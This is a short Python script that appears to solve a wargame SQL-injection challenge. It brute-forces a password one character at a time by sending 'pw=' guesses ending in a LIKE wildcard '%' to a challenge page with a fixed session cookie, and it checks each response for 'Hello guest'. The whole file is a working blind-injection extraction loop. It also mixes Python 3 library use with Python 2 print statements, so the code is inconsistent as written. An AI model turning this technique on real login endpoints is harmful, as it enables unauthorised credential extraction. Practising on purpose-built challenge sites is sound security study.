import requests

url = 'https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php' #fix it!
headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'}
cookies={'PHPSESSID':'mj9g3dlqmn5o6aoonq96o5vput'} #fix it!
flag=""
text="Hello guest" #fix it!

for i in range(1,10):
    for j in range(48,127):
        token=0
        url = 'https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php'
        url+="?pw="+flag+chr(j)+"%"
        response = requests.get(url, headers=headers, cookies=cookies)
        status_code = response.status_code
        html_data = response.text
        print(response.url)
        if (html_data.find(text) != -1):
            print "Find Key[+]"
            flag+=chr(j)
            print flag
            token=1
            break
    if(token==0):
        break
